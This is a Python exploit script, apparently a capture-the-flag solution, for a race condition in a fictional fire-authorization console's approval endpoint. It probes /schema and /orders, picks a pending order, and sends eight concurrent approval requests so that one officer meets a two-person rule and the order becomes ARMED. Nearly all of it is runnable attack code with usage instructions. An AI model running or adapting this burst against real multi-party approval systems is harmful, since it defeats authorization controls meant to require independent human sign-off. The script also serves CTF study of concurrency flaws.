#!/usr/bin/env python3
"""
Kessara Fire-Authorization Console (CSCTF 2026, Web)

A race condition in the approval endpoint: a single authenticated officer
satisfies the two-person approval threshold by firing a synchronized burst of
concurrent approval requests; both are recorded in the same epoch and counted
toward required_approvals = 2. The target order reaches ARMED and returns its
arming authorization.

Usage: python3 kessara_fire_authorization.py <base_url> <bearer_token> [order_id]

The CTF instance is retired; this PoC documents the exploit path.
"""
import sys
import json
import http.client
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://<instance>"
BEARER = sys.argv[2] if len(sys.argv) > 2 else "<operator_key>"
ORDER_ID = sys.argv[3] if len(sys.argv) > 3 else "<order-id>"  # e.g. the PENDING_AUTH order from /orders
BURST = 8

_p = urllib.parse.urlparse(BASE)
HOST = _p.hostname or "<instance>"
PORT = _p.port or (443 if _p.scheme == "https" else 80)
USE_TLS = _p.scheme == "https"


def request(method: str, path: str, body: bytes = None) -> tuple:
    conn_cls = http.client.HTTPSConnection if USE_TLS else http.client.HTTPConnection
    conn = conn_cls(HOST, PORT, timeout=15)
    headers = {"Authorization": f"Bearer {BEARER}"}
    conn.request(method, path, body=body, headers=headers)
    resp = conn.getresponse()
    raw = resp.read().decode("utf-8", errors="replace")
    conn.close()
    try:
        parsed = json.loads(raw)
    except json.JSONDecodeError:
        parsed = raw
    return resp.status, parsed


def main() -> None:
    # Recon: /schema documents the API and the two-person rule; /orders lists
    # the PENDING_AUTH order to arm.
    status, schema = request("GET", "/schema")
    print(f"[*] /schema -> {status}: {schema}")
    status, orders = request("GET", "/orders")
    print(f"[*] /orders -> {status}: {orders}")

    order_id = ORDER_ID
    if order_id == "<order-id>" and isinstance(orders, (dict, list)):
        # Best-effort: pick the first PENDING_AUTH order from the listing.
        items = orders if isinstance(orders, list) else orders.get("orders", [])
        for item in items:
            if isinstance(item, dict) and item.get("status") == "PENDING_AUTH":
                order_id = item.get("order_id") or item.get("id") or order_id
                break

    # Exploit: synchronized burst of bodyless concurrent approvals.
    path = f"/orders/{order_id}/approve"
    with ThreadPoolExecutor(max_workers=BURST) as pool:
        results = list(pool.map(lambda _: request("POST", path, None), range(BURST)))
    for i, (status, body) in enumerate(results):
        print(f"[*] approve[{i}] -> {status}: {body}")


if __name__ == "__main__":
    main()
